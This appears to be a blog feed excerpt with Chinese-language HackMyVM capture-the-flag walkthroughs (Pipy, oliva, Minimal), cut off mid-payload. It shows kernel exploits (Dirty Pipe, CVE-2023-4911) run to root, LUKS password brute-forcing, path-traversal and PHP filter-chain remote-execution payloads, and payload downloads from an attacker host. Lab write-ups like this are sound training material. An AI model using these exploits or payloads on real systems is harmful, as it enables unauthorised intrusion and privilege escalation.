/snap/core/16202/bin/ping
/snap/core/16202/bin/ping6
/snap/core/16202/bin/su
/snap/core/16202/bin/umount
/snap/core/16202/usr/bin/chfn
/snap/core/16202/usr/bin/chsh
/snap/core/16202/usr/bin/gpasswd
/snap/core/16202/usr/bin/newgrp
/snap/core/16202/usr/bin/passwd
/snap/core/16202/usr/bin/sudo
/snap/core/16202/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/16202/usr/lib/openssh/ssh-keysign
/snap/core/16202/usr/lib/snapd/snap-confine
/snap/core/16202/usr/sbin/pppd
angela@pipy:/mnt$ /sbin/getcap -r / 2&gt;/dev/null
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
/usr/bin/mtr-packet cap_net_raw=ep
/usr/bin/ping cap_net_raw=ep
/snap/core20/2434/usr/bin/ping cap_net_raw=ep
/snap/core20/2015/usr/bin/ping cap_net_raw=ep
angela@pipy:/mnt$ ss -tuln | grep tcp
tcp   LISTEN 0      80                  127.0.0.1:3306      0.0.0.0:*        
tcp   LISTEN 0      4096            127.0.0.53%lo:53        0.0.0.0:*        
tcp   LISTEN 0      128                   0.0.0.0:22        0.0.0.0:*        
tcp   LISTEN 0      1024                127.0.0.1:4226      0.0.0.0:*        
tcp   LISTEN 0      511                         *:80              *:*        
tcp   LISTEN 0      128                      [::]:22           [::]:*        
angela@pipy:/mnt$ nc
nc          nc.openbsd  
angela@pipy:/mnt$ nc 127.0.0.1 4226
a
hello
root
angela@pipy:/mnt$ ls
angela@pipy:/mnt$ nc 127.0.0.1 4226
root
admin
```

‰ªÄ‰πàÈÉΩÊ≤°ÊâæÂà∞,ËøòÊ≤°ÂÆöÊó∂‰ªªÂä°Ôºå‰∏ç‰ºöÊòØ**ÂÜÖÊ†∏ÊèêÊùÉ**ÂêßÔºåÂ∞ùËØï‰∏Ä‰∏ãÂèØ‰∏çÂèØ‰ª•‰ΩøÁî®Ëá™Âä®ÂåñÂ∑•ÂÖ∑ÊèêÊùÉ

```bash
angela@pipy:/mnt$ cd /tmp/
angela@pipy:/tmp$ wget 192.168.205.141/traitor-386
--2025-01-18 02:52:07--  http://192.168.205.141/traitor-386
Connecting to 192.168.205.141:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8475976 (8.1M) [application/octet-stream]
Saving to: ‚Äòtraitor-386‚Äô

traitor-386                                                  0%[                                                                       traitor-386                                                100%[========================================================================================================================================&gt;]   8.08M  --.-KB/s    in 0.03s   

2025-01-18 02:52:07 (282 MB/s) - ‚Äòtraitor-386‚Äô saved [8475976/8475976]

angela@pipy:/tmp$ chmod +x traitor-386 
angela@pipy:/tmp$ ./traitor-386 -a

                                                                                                                                     
‚ñÄ‚ñà‚ñÄ‚ÄÉ‚ñà‚ñÄ‚ñà‚ÄÉ‚ñÑ‚ñÄ‚ñà‚ÄÉ‚ñà‚ÄÉ‚ñÄ‚ñà‚ñÄ‚ÄÉ‚ñà‚ñÄ‚ñà‚ÄÉ‚ñà‚ñÄ‚ñà                                                                                                            
‚ñë‚ñà‚ñë‚ÄÉ‚ñà‚ñÄ‚ñÑ‚ÄÉ‚ñà‚ñÄ‚ñà‚ÄÉ‚ñà‚ÄÉ‚ñë‚ñà‚ñë‚ÄÉ‚ñà‚ñÑ‚ñà‚ÄÉ‚ñà‚ñÄ‚ñÑ v0.0.14                                                                                                    
https://github.com/liamg/traitor                                                                                                     
                                                                                                                                     
[+] Assessing machine state...                                                                                                       
[+] Checking for opportunities...
[+][kernel:CVE-2022-0847] Kernel version 5.15.0 is vulnerable!
[+][kernel:CVE-2022-0847] Opportunity found, trying to exploit it...
[+][kernel:CVE-2022-0847] Attempting to set root password...
[+][kernel:CVE-2022-0847] Opening '/etc/passwd' for read...
[+][kernel:CVE-2022-0847] Creating pipe...
[+][kernel:CVE-2022-0847] Determining pipe size...
[+][kernel:CVE-2022-0847] Pipe size is 65536.
[+][kernel:CVE-2022-0847] Filling pipe...
[+][kernel:CVE-2022-0847] Draining pipe...
[+][kernel:CVE-2022-0847] Pipe drained.
[+][kernel:CVE-2022-0847] Splicing data...
[+][kernel:CVE-2022-0847] Writing to dirty pipe...
[+][kernel:CVE-2022-0847] Write of '/etc/passwd' successful!
[+][kernel:CVE-2022-0847] Starting shell...
[+][kernel:CVE-2022-0847] Please exit the shell once you are finished to ensure the contents of /etc/passwd is restored.
[+][kernel:CVE-2022-0847] Setting up tty...
[+][kernel:CVE-2022-0847] Attempting authentication as root...
[+][kernel:CVE-2022-0847] Restoring contents of /etc/passwd...
[+][kernel:CVE-2022-0847] Opening '/etc/passwd' for read...
[+][kernel:CVE-2022-0847] Creating pipe...
[+][kernel:CVE-2022-0847] Determining pipe size...
[+][kernel:CVE-2022-0847] Pipe size is 65536.
[+][kernel:CVE-2022-0847] Filling pipe...
[+][kernel:CVE-2022-0847] Draining pipe...
[+][kernel:CVE-2022-0847] Pipe drained.
[+][kernel:CVE-2022-0847] Splicing data...
[+][kernel:CVE-2022-0847] Writing to dirty pipe...
[+][kernel:CVE-2022-0847] Write of '/etc/passwd' successful!
[+][error] Exploit failed: invalid password
[+] Continuing to look for opportunities
[+] Nothing found to exploit.
```

‰∏çÂèØ‰ª•ÔºåÈÇ£ËøòÊòØÊàë‰ª¨Ëá™Â∑±ÊâæÂêß

```bash
angela@pipy:/tmp$ uname -a
Linux pipy 5.15.0-84-generic #93-Ubuntu SMP Tue Sep 5 17:16:10 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
angela@pipy:/tmp$ lsb_release -a
No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 22.04.3 LTS
Release:        22.04
Codename:       jammy
```

Êâæ‰∏Ä‰∏ãÔºåÂèëÁé∞**[CVE-2023-4911](https://github.com/leesh3288/CVE-2023-4911)**ÂèØ‰ª•Ôºå‰ΩÜÊòØË¶ÅÁî®ÁâπÂÆöÁöÑËÑöÊú¨ÔºåÊúâ‰∫õËÑöÊú¨‰∏çË°å

```bash
#kali
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/tmp]
‚îî‚îÄ$ wget https://github.com/leesh3288/CVE-2023-4911/archive/refs/heads/main.zip
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/tmp]
‚îî‚îÄ$ python3 -m http.server 80                                                                   
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
#Èù∂Êú∫
angela@pipy:/tmp$ wget 192.168.205.141/main.zip
--2025-01-18 03:06:17--  http://192.168.205.141/main.zip
Connecting to 192.168.205.141:80... failed: Connection refused.
angela@pipy:/tmp$ wget 192.168.205.141/main.zip
--2025-01-18 03:06:25--  http://192.168.205.141/main.zip
Connecting to 192.168.205.141:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3044 (3.0K) [application/octet-stream]
Saving to: ‚Äòmain.zip‚Äô

main.zip                                                   0%[                                                                       main.zip.1                                                 100%[========================================================================================================================================&gt;]   2.97K  --.-KB/s    in 0s    

2025-01-18 03:06:25 (21.8 MB/s) - ‚Äòmain.zip‚Äô saved [3044/3044]

angela@pipy:/tmp$ unzip main.zip
Archive:  main.zip
acf0d3a8bd4c437475a7c4c83f5790e53e8103cb
   creating: CVE-2023-4911-main/
  inflating: CVE-2023-4911-main/Makefile  
  inflating: CVE-2023-4911-main/README.md  
  inflating: CVE-2023-4911-main/exp.c  
  inflating: CVE-2023-4911-main/gen_libc.py  
angela@pipy:/tmp$ cd CVE-2023-4911-main/
angela@pipy:/tmp/CVE-2023-4911-main$ make
gcc -o exp exp.c
python3 gen_libc.py
[*] '/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
./exp
try 100
# id
uid=0(root) gid=0(root) groups=0(root),1000(angela)

```sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_Pipy.html</guid><pubDate>Fri, 27 Jun 2025 09:33:28 +0000</pubDate></item><item><title>hmv_oliva</title><link>https://7r1UMPHK.github.io/post/hmv_oliva.html</link><description># hmv_oliva

# 0. ÁÆÄ‰ªã

**Èù∂Êú∫**Ôºö[hackmyvm - oliva](https://hackmyvm.eu/machines/machine.php?vm=oliva)
**ÈöæÂ∫¶**ÔºöÁªøËâ≤
**ÁõÆÊ†á IP**Ôºö192.168.205.138
**Êú¨Êú∫ IP**Ôºö192.168.205.141

# 1. Êâ´Êèè

‰ΩøÁî® `nmap` Êâ´ÊèèÔºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.138
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-22 08:43 CST
Nmap scan report for 192.168.205.138
Host is up (0.00029s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:84:83:23 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.44 seconds
```

Êâ´ÊèèÁªìÊûúÊòæÁ§∫ÁõÆÊ†áÂºÄÂêØ‰∫Ü **SSH** (22/tcp) Âíå **HTTP** (80/tcp) ÊúçÂä°„ÄÇ

# 2. Ë∏©ÁÇπ

ËÆøÈóÆ‰∏ªÈ°µÊòØ Nginx Ê¨¢ËøéÈ°µÈù¢ÔºåÊ≤°ÊúâÂèëÁé∞Êúâ‰ª∑ÂÄºÁöÑ‰ø°ÊÅØ„ÄÇËøõË°åÁõÆÂΩïÁàÜÁ†¥„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ feroxbuster -u 'http://192.168.205.138/' -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt,md
```

ÁªìÊûúÊòæÁ§∫Ôºö

```
200      GET    70541l   415824w 34717484c http://192.168.205.138/oliva
200      GET        5l       10w       69c http://192.168.205.138/index.php
200      GET       23l       75w      615c http://192.168.205.138/index.html
```

`http://192.168.205.138/oliva` ÊòØ‰∏™‰∫åËøõÂà∂Êñá‰ª∂ÔºåËøõ‰∏ÄÊ≠•ÂàÜÊûêÂÆÉ„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ file oliva
oliva: LUKS encrypted file, ver 2, header size 16384, ID 3, algo sha256, salt 0x14fa423af24634e8..., UUID: 9a391896-2dd5-4f2c-84cf-1ba6e4e0577e, crc 0x6118d2d9b595355f..., at 0x1000 {'keyslots':{'0':{'type':'luks2','key_size':64,'af':{'type':'luks1','stripes':4000,'hash':'sha256'},'area':{'type':'raw','offse
```

`file` ÂëΩ‰ª§ËæìÂá∫ÊòæÁ§∫ `oliva` ÊòØ‰∏Ä‰∏™ **LUKS (Linux Unified Key Setup) Âä†ÂØÜÊñá‰ª∂**ÔºåÊàë‰ª¨Â∞ùËØïÊèêÂèñÂÆÉÁöÑÂìàÂ∏åËøõË°åÁàÜÁ†¥

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ luks2john oliva &gt; hash
oliva : Only LUKS1 is supported. Used version: 2
```

`luks2john` Â∑•ÂÖ∑ÂΩìÂâçÂè™ÊîØÊåÅ LUKS ÁâàÊú¨ 1ÔºåËÄåÊàë‰ª¨ÁöÑÊñá‰ª∂ÊòØ LUKS ÁâàÊú¨ 2 Ê†ºÂºèÔºåÊâÄ‰ª•Êàë‰ª¨ÂæóÂè¶ÂØªÂá∫Ë∑Ø„ÄÇÊâæÂà∞‰∫Ü‰∏ÄÁØá[ÊñáÁ´†](https://diverto.github.io/2019/11/18/Cracking-LUKS-passphrases)ÔºåÊàë‰ª¨Â∞ùËØï‰∏Ä‰∏ã

![Image](https://github.com/user-attachments/assets/922131df-15e3-4d27-9715-1823b19a4fbb)

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ sudo apt install bruteforce-luks -y
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ bruteforce-luks -t 4 -f /usr/share/wordlists/q5000.txt oliva
Password found: bebita
```

‰ΩøÁî®Êö¥ÂäõÁ†¥Ëß£ÊàêÂäüËé∑ÂæóÂè£‰ª§ `bebita`ÔºåÊé•‰∏ãÊù•ÊâìÂºÄÂä†ÂØÜÊñá‰ª∂„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ sudo cryptsetup luksOpen oliva oliva
ËØ∑ËæìÂÖ• oliva ÁöÑÂè£‰ª§Ôºöbebita
```

Êü•ÁúãÊñá‰ª∂Á≥ªÁªüÔºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ lsblk
NAME    MAJ:MIN RM  SIZE RO TYPE  MOUNTPOINTS
loop0     7:0    0 19.1M  0 loop  
‚îî‚îÄoliva 254:0    0  3.1M  0 crypt
```

ÊåÇËΩΩÂπ∂Êü•ÁúãÊñá‰ª∂Ôºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ sudo mount /dev/mapper/oliva /mnt
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt]
‚îî‚îÄ$ ls -al
ÊÄªËÆ° 18
drwxr-xr-x  3 root root  1024 2023Âπ¥ 7Êúà 4Êó• .
drwxr-xr-x 18 root root  4096 12Êúà 6Êó• 19:03 ..
drwx------  2 root root 12288 2023Âπ¥ 7Êúà 4Êó• lost+found
-rw-r--r--  1 root root    16 2023Âπ¥ 7Êúà 4Êó• mypass.txt
```

Êü•Áúã `mypass.txt` ÂÜÖÂÆπÔºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt]
‚îî‚îÄ$ cat mypass.txt
Yesthatsmypass!
```

# 3. ÁôªÂΩï SSH

‰ΩøÁî®Êñá‰ª∂‰∏≠ÊâæÂà∞ÁöÑÂØÜÁ†Å `Yesthatsmypass!` ÁôªÂΩï SSH„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt]
‚îî‚îÄ$ ssh oliva@192.168.205.138
oliva@192.168.205.138's password: Yesthatsmypass!
oliva@oliva:~$ id
uid=1000(oliva) gid=1000(oliva) grupos=1000(oliva),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev)
```

# 4. ÊèêÊùÉ

Êü•Áúã `sudo` ÈÖçÁΩÆÔºö

```bash
oliva@oliva:~$ sudo -l
-bash: sudo: orden no encontrada
```

`sudo` Êú™ÂÆâË£ÖÔºåÊ£ÄÊü•Á≥ªÁªüÊùÉÈôêÔºö

```bash
oliva@oliva:~$ find / -perm -4000 -type f 2&gt;/dev/null
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/chsh
/usr/bin/gpasswd
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
```

‰ΩøÁî® `getcap` Êü•ÁúãÊùÉÈôêÔºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ /sbin/getcap -r / 2&gt;/dev/null
/usr/bin/nmap cap_dac_read_search=eip
/usr/bin/ping cap_net_raw=ep
```

Êü•Áúã `/var/www/html/` ÁõÆÂΩïÔºå‰ΩøÁî®`nmap`ÁúãÊúâÊ≤°Êúâ‰ªÄ‰πàÈöêËóè‰ø°ÊÅØ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ cd /var/www/html/
‚îî‚îÄ$ ls -la
total 19548
drwxr-xr-x 2 root     root         4096 jul  4  2023 .
drwxr-xr-x 3 root     root         4096 jul  4  2023 ..
-rw-rw---- 1 www-data www-data      615 jul  4  2023 index.html
-rw-rw---- 1 www-data www-data      163 jul  4  2023 index.php
-rw-rw---- 1 www-data www-data 20000000 jul  4  2023 oliva
oliva@oliva:/var/www/html$ nmap -iL index.php 
Starting Nmap 7.93 ( https://nmap.org ) at 2025-01-22 03:34 CET
Failed to resolve 'Hi'.
Failed to resolve 'oliva,'.
Failed to resolve 'Here'.
Failed to resolve 'the'.
Failed to resolve 'pass'.
Failed to resolve 'to'.
Failed to resolve 'obtain'.
Failed to resolve 'root:'.
Failed to resolve '&lt;?php'.
Failed to resolve '$dbname'.
Failed to resolve '='.
Failed to resolve ''easy';'.
Failed to resolve '$dbuser'.
Failed to resolve '='.
Failed to resolve ''root';'.
Failed to resolve '$dbpass'.
Failed to resolve '='.
Failed to resolve ''Savingmypass';'.
Failed to resolve '$dbhost'.
Failed to resolve '='.
Failed to resolve ''localhost';'.
Failed to resolve '?&gt;'.
Failed to resolve '&lt;a'.
Unable to split netmask from target expression: 'href='oliva'&gt;CLICK!&lt;/a&gt;'
WARNING: No targets were specified, so 0 hosts scanned.
Nmap done: 0 IP addresses (0 hosts up) scanned in 65.35 seconds
```

ÈÄöËøáÊü•Áúã `index.php` ‰∏≠ÁöÑÂÜÖÂÆπÔºåÂèëÁé∞Êï∞ÊçÆÂ∫ìÁôªÂΩï‰ø°ÊÅØÔºåÂπ∂ÁôªÂΩï MariaDB Êï∞ÊçÆÂ∫ìÔºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ mysql -u root -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 5
Server version: 10.11.3-MariaDB-1 Debian 12
```

Êü•ÁúãÊï∞ÊçÆÂ∫ì `easy`Ôºö

```bash
MariaDB [(none)]&gt; show databases;
+--------------------+
| Database           |
+--------------------+
| easy               |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+

MariaDB [(none)]&gt; use easy;
MariaDB [easy]&gt; show tables;
+----------------+
| Tables_in_easy |
+----------------+
| logging        |
+----------------+
```

Êü•Áúã `logging` Ë°®Ôºö

```bash
MariaDB [easy]&gt; select * from logging;
+--------+------+--------------+
| id_log | uzer | pazz         |
+--------+------+--------------+
|      1 | root | OhItwasEasy! |
+--------+------+--------------+
```

‰ΩøÁî®ÂØÜÁ†Å `OhItwasEasy!` ÁôªÂΩï root Áî®Êà∑Ôºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ su -
Contrase√±a: OhItwasEasy!
root@oliva:~# id
uid=0(root) gid=0(root) grupos=0(root)
```

ÊàêÂäüÊèêÊùÉÔºåËé∑Âèñ root ÊùÉÈôê„ÄÇ

# 5.Êî∂Â∞æ

```bash
# Âç∏ËΩΩÂä†ÂØÜËÆæÂ§á
sudo umount /mnt

# ÂÖ≥Èó≠ LUKS Âä†ÂØÜËÆæÂ§á
sudo cryptsetup luksClose oliva

# Êü•ÁúãËÆæÂ§áÊòØÂê¶Â∑≤ÁªèÂÖ≥Èó≠
lsblk

# Ê£ÄÊü•ÊòØÂê¶‰ªçÁÑ∂ÊåÇËΩΩ
mount | grep /dev/mapper
```sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_oliva.html</guid><pubDate>Fri, 27 Jun 2025 09:33:26 +0000</pubDate></item><item><title>hmv_Minimal</title><link>https://7r1UMPHK.github.io/post/hmv_Minimal.html</link><description># hmv_Minimal

# 0.ÁÆÄ‰ªã

**Èù∂Êú∫**Ôºö[hackmyvm - Minimal](https://hackmyvm.eu/machines/machine.php?vm=Minimal)
**ÈöæÂ∫¶**ÔºöÈªÑËâ≤
**ÁõÆÊ†á IP**Ôºö192.168.205.135
**Êú¨Êú∫ IP**Ôºö192.168.205.141

# 1.Êâ´Êèè

`nmap`Ëµ∑Êâã

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.135
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-14 14:58 CST
Nmap scan report for 192.168.205.135
Host is up (0.00054s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:0D:67:64 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.62 seconds
```

ÂÖàÁúã**80Á´ØÂè£**Ôºå**22Á´ØÂè£**ÂÄôË°•

# 2.Ë∏©ÁÇπ

![image](https://github.com/user-attachments/assets/e779669a-453f-45b8-af0d-3cbc172561ce)

ÔºàÈ°µÈù¢Êå∫ÁÆÄÊ¥ÅÔºâÂèëÁé∞‰∏Ä‰∏™**ÁôªÂΩïÁΩëÈ°µ(login.php)**  ÔºåÊµãËØï‰∫Ü`Âº±ÂØÜÁ†Å„ÄÅsqlÊ≥®ÂÖ•„ÄÅ‰∏áËÉΩÂØÜÁ†Å`ÂùáÊó†ÊûúÔºåÊ≤°ÊúâÁé∞ÊàêÁöÑÔºåÊàë‰ª¨Ëá™Â∑±Ê≥®ÂÜå‰∏Ä‰∏™

![image](https://github.com/user-attachments/assets/d57f31d8-97d2-419e-99a0-a002e6e3086d)

Ê≥®ÂÜåÂÆå‰πãÂêéÔºåÂèØ‰ª•Êää‰∏Ä‰∫õÂïÜÂìÅÂä†ÂÖ•Ë¥≠Áâ©ËΩ¶

![image](https://github.com/user-attachments/assets/535d5286-48d7-4a29-ae43-f3ceebf03c31)

ÂΩì‰Ω†ÂáÜÂ§á‰π∞ÂçïÁöÑÊó∂ÂÄôÔºåÁÇπÂáª`Buy items`‰ºöÂèëÁé∞ÔºåÁΩëÂùÄÂá∫Áé∞‰∫ÜÂèòÂåñ„ÄÇÊñ∞ÁΩëÂùÄÂèØËÉΩ‰ºöÂ≠òÂú®Êñá‰ª∂ÂåÖÂê´ÊºèÊ¥ûÔºåÊàë‰ª¨Â∏Æ‰ªñÊµãËØï‰∏Ä‰∏ã‚ùê‚Äø‚ùë

```bash
http://192.168.205.135/shop_cart.php?action=/etc/passwd
http://192.168.205.135/shop_cart.php?action=../../../../etc/passwd
http://192.168.205.135/shop_cart.php?action=....//....//....//....//etc/passwd
http://192.168.205.135/shop_cart.php?action=php://filter/convert.base64-encode/resource=index
```

![image](https://github.com/user-attachments/assets/d2f1f884-fd50-4efd-b512-b8667466e41e)

ÊµãËØï‰∫ÜÂõõÊù°ÔºåÂè™ÊúâÁ¨¨ÂõõÊù°ÊúâÂèçÂ∫îÔºåÊàë‰ª¨ÁªßÁª≠Â∞ùËØïÂèØ‰∏çÂèØ‰ª•ÈÄöËøá**PHP ËøáÊª§Âô®Èìæ** Êù•ÊâßË°åÂëΩ‰ª§

![image](https://github.com/user-attachments/assets/845afd2d-5281-4308-8119-58e7de747b75)

```bash
http://192.168.205.135/shop_cart.php?action=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&amp;0=id
```

Ôºà‚òÜœâ‚òÜ*ÔºâÂèØ‰ª•ÊâßË°åÔºå‰ΩøÁî®ÁöÑÊòØËøô‰∏™Â∑•ÂÖ∑ [PHP Filter Chain Generator](https://github.com/synacktiv/php_filter_chain_generator)„ÄÇÊàë‰ª¨Âºπ‰∏™shellÂõûÊù•

```bash
http://192.168.205.135/shop_cart.php?action=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UT